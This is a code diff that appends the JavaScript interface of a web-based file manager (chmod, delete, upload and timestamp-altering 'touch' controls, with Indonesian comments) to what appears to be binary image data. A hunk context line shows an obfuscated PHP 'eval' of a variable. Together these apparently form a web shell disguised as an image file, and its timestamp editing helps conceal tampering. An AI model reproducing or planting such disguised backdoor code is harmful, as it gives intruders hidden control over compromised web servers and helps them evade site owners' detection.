+    // Scroll ke atas dengan sedikit delay untuk memastikan form sudah muncul
+    setTimeout(scrollToTop, 10);
+};
+
+// Variabel untuk modal konfirmasi
+var currentFormId = null;
+var currentAction = null;
+
+// Fungsi untuk menampilkan konfirmasi Chmod
+function showChmodConfirm(formId, fileName) {
+    currentFormId = formId;
+    currentAction = 'chmod';
+    document.getElementById('confirmMessage').textContent = 
+        'Are you sure you want to change permissions for "' + fileName + '"?';
+    document.getElementById('confirmModal').style.display = 'block';
+}
+
+// Fungsi untuk menampilkan konfirmasi Delete dari kolom Aksi
+function showDeleteConfirm(formId, itemName, itemType) {
+    currentFormId = formId;
+    currentAction = 'delete';
+    document.getElementById('confirmMessage').textContent = 
+        'Are you sure you want to delete the ' + itemType + ' "' + itemName + '"?';
+    document.getElementById('confirmModal').style.display = 'block';
+}
+
+// Fungsi untuk menampilkan konfirmasi Delete dari action-row
+function showDeleteActionConfirm() {
+    const deleteForm = document.getElementById('deleteActionForm');
+    const deletePath = deleteForm.querySelector('input[name="delete_item_name"]').value;
+    
+    if (!deletePath) {
+        showMessage('Please enter a file/folder path to delete', 'error');
+        return;
+    }
+    
+    currentFormId = 'deleteActionForm';
+    currentAction = 'delete';
+    document.getElementById('confirmMessage').textContent = 
+        'Are you sure you want to delete "' + deletePath + '"?';
+    document.getElementById('confirmModal').style.display = 'block';
+}
+
+// Event listener untuk tombol Yes pada modal konfirmasi
+document.getElementById('confirmYes').onclick = function() {
+    if (currentFormId) {
+        const form = document.getElementById(currentFormId);
+        if (form) {
+            form.submit();
+        }
+    }
+    document.getElementById('confirmModal').style.display = 'none';
+};
+
+// Event listener untuk tombol No pada modal konfirmasi
+document.getElementById('confirmNo').onclick = function() {
+    document.getElementById('confirmModal').style.display = 'none';
+};
+
+function updateFileName(input) {
+    if (input.files && input.files[0]) {
+        var fileName = input.files[0].name;
+        document.getElementById('fileLabel').textContent = fileName;
+    } else {
+        document.getElementById('fileLabel').textContent = 'Choose file...';
+    }
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    // Setup MutationObserver untuk memantau perubahan pada form touch
+    const touchFormContainer = document.getElementById('touchFormContainer');
+    const observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+            if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
+                const displayValue = touchFormContainer.style.display;
+                if (displayValue === 'block') {
+                    // Form touch baru saja ditampilkan, scroll ke atas
+                    setTimeout(scrollToTop, 50);
+                }
+            }
+        });
+    });
+    
+    // Mulai memantau perubahan atribut style pada form touch
+    observer.observe(touchFormContainer, { attributes: true });
+    
+    // Tangani semua tombol Touch di seluruh halaman (kolom Dimodifikasi)
+    const allTouchButtons = document.querySelectorAll('.clickable-date');
+    allTouchButtons.forEach(element => {
+        // Simpan nilai onclick asli
+        const originalOnclick = element.getAttribute('onclick');
+        
+        if (originalOnclick && originalOnclick.includes('showTouchForm')) {
+            // Ekstrak parameter dari onclick
+            const matches = originalOnclick.match(/'([^']+)'/g);
+            if (matches && matches.length >= 2) {
+                const filePath = matches[0].replace(/'/g, '');
+                const timestamp = matches[1].replace(/'/g, '');
+                
+                // Hapus onclick asli
+                element.removeAttribute('onclick');
+                
+                // Tambahkan event listener baru
+                element.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    // Panggil fungsi showTouchForm yang sudah di-override
+                    window.showTouchForm(filePath, timestamp);
+                }, true); // Use capture phase
+            }
+        }
+    });
+    
+    // Tangani semua tombol Edit di View File Section
+    const editButtons = document.querySelectorAll('#viewFileSection button[onclick^="showEditForm"]');
+    editButtons.forEach(button => {
+        button.addEventListener('click', function(e) {
+            e.preventDefault();
+            const filePath = this.getAttribute('onclick').match(/'([^']+)'/)[1];
+            showEditForm(filePath);
+        });
+    });
+    
+    // Tangani semua tombol Touch di View File Section
+    const touchButtons = document.querySelectorAll('#viewFileSection button[onclick^="showTouchForm"]');
+    touchButtons.forEach(button => {
+        button.addEventListener('click', function(e) {
+            e.preventDefault();
+            const onclickText = this.getAttribute('onclick');
+            const matches = onclickText.match(/'([^']+)'/g);
+            if (matches && matches.length >= 2) {
+                const filePath = matches[0].replace(/'/g, '');
+                const timestamp = matches[1].replace(/'/g, '');
+                showTouchForm(filePath, timestamp);
+            }
+        });
+    });
+    
+    // Tangani tombol Touch di dalam form Edit
+    const editFormTouchButtons = document.querySelectorAll('#editFormContainer button[onclick^="showTouchForm"]');
+    editFormTouchButtons.forEach(button => {
+        button.addEventListener('click', function(e) {
+            e.preventDefault();
+            const onclickText = this.getAttribute('onclick');
+            const matches = onclickText.match(/'([^']+)'/g);
+            if (matches && matches.length >= 2) {
+                const filePath = matches[0].replace(/'/g, '');
+                const timestamp = matches[1].replace(/'/g, '');
+                showTouchForm(filePath, timestamp);
+            }
+        });
+    });
+});
+</script>
+
+</body>
+</html>
+			
+
+		
+
+
+ÿÛ C	ÿÀ    ÿÄ               ÿÄ "          #QrÿÄ               ÿÄ &         1! A"2qQaáÿÚ   ? Øy,æ/3JæÝ¹Èß²Ø‹5êXw²±ÉyˆR”¾I0ó2—PI¾IÌÚiMö¯–þrìN&"KgX:Šíµ•nTJnLK„…@!‰-ýùúmë;ºgµŒ&ó±hw’¯Õ@”Ü—9ñ-ë.²1<yà‚¹ïQÐU„Û?.’¦èûbß±©Ö«Âw*VŒ) `$‰bØÔŸ’ëXÖ-ËTÜíGÚ3ð«g Ÿ§¯—Jx„–’U/ÂÅv_s(Hÿ @TñJÑãõçn­‚!ÈgfbÓc­:él[ðQe9ÀPLbÃãCµm[5¿ç'ªjglå‡Ûí_§Úõl-;"PkÞÞÁQâ¼_Ñ^¢SŸ  x?"¸¦ùYé¨ÒOÈ	q’`~~ÚtËU¹CÚ’êV		I1Áß_ÿÙ
 
  !U*  A 9%n  o M - 
 5J  w@O|l:Bg y= B=jq K - jM 4EP N q�f     ^ u>� $k�( �H l�EW
@@ -36,3 +1995,4 @@ if($DlNEI!==false){eval($DlNEI);}else{/* failed */}
   e  ~ , 9 � k;   +ny   )s=9)  � u_l  " Z   ; x   =.  
 M=  +?  ^    q $ .[ i [   Fj   y    Ux { >_  xH  > ;   8    <   w/l hy   
    9o <: 'f4    |
+
